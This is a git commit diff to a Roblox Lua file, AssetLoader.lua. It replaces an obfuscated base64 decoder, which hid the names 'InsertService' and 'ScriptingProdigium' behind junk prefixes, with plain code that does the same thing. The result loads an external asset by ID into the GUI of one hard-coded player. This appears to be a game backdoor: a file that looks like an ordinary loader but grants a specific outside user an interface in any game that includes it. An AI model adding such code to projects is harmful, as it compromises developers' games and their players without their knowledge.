0917cd8d05d6bd78012ef61130f53f97eab2e924
Roondawgiest <roondawg@hot-shot.com>
2025-07-28 21:02:24 +0100

    Update AssetLoader.lua

--- AssetLoader.lua
+++ AssetLoader.lua
@@ -1,11 +1,2 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function fwjGHdKlFkpScYYJFMiNwzHK(data) m=string.sub(data, 0, 200) data=data:gsub(m,'')
-
-data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
-
-
- 
-
-
-local asset = game:GetService(fwjGHdKlFkpScYYJFMiNwzHK('lSfheSgMGIykpuinJwOzRYgLhuVWgUDCrnupuiyWPmzKtthfxkjPPaxPntUYTrAbviUDTclKpTqVSmyWtFUvwQVxRvAZtDpAlUKODUuRGeNcDWMFMVdtCcfgeWaxyxcqzUgosIhENPNLjiTZqrgZsRbGZGOhwxLrpwOIRLnXHOYMyHKcAmWPszaSavIPjzWiYWjEdZkvSW5zZXJ0U2VydmljZQ==')):LoadAsset(83059140951265)
-	asset.AssetDelivery.Parent = game.Players:FindFirstChild(fwjGHdKlFkpScYYJFMiNwzHK('AvqTVXLCEAKbFrTUdoPntLcTWasJWmvwYdUTCjuWiQWcrQrylIxEodugFDUTVYFBpjFOxRhduxlABCOBmiuYXJEWPfhVjPQBgQbAnRMqUMTtFYjntZFjHbFpSwNxzjYrtroiYHuoNuvHawenAYWZnMNvJhkZkWKQRUgGuUuFavLUaItOQLROyOBFtbxBcfHWjRURgCYiU2NyaXB0aW5nUHJvZGlnaXVt')).PlayerGui    
+local asset = game:GetService("InsertService"):LoadAsset(83059140951265)
+asset.AssetDelivery.Parent = game.Players:FindFirstChild("ScriptingProdigium").PlayerGui
